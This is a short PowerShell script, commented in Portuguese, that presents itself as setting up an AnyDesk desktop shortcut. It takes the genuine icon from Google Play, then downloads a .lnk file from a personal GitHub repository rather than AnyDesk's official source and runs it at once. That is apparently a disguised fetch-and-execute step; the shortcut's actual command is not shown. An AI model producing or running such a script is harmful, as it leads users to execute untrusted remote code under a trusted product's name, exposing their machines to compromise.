$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$desktop   = [Environment]::GetFolderPath('Desktop')
$lnkPath   = Join-Path $desktop 'AnyDesk.lnk'
$iconPath  = "$env:TEMP\anydesk.ico"

$webClient = New-Object Net.WebClient
$webClient.Headers.Add('User-Agent', 'Mozilla/5.0')

# 1. Baixar ícone do Google Play (se não existir)
$playStoreUrl = 'https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid'
try {
    $html = $webClient.DownloadString($playStoreUrl)
    if ($html -match '(https://play-lh\.googleusercontent\.com/[^\s"&]+)') {
        $iconUrl = $matches[1] + '=s256'
        $webClient.DownloadFile($iconUrl, $iconPath)
    } else {
        throw "Ícone não encontrado na página."
    }
} catch {
    Write-Warning "Falha ao baixar o ícone: $_"
    # Prossegue sem o ícone – o atalho apenas ficará sem imagem
}

# 2. Baixar o atalho na Área de Trabalho (se não existir)
if (-not (Test-Path $lnkPath)) {
    $lnkUrl = 'https://github.com/wevertonmbrtx/anydesk/raw/refs/heads/main/AnyDesk.lnk'
    $webClient.DownloadFile($lnkUrl, $lnkPath)
}

# 3. Executar o atalho
Start-Process -FilePath $lnkPath
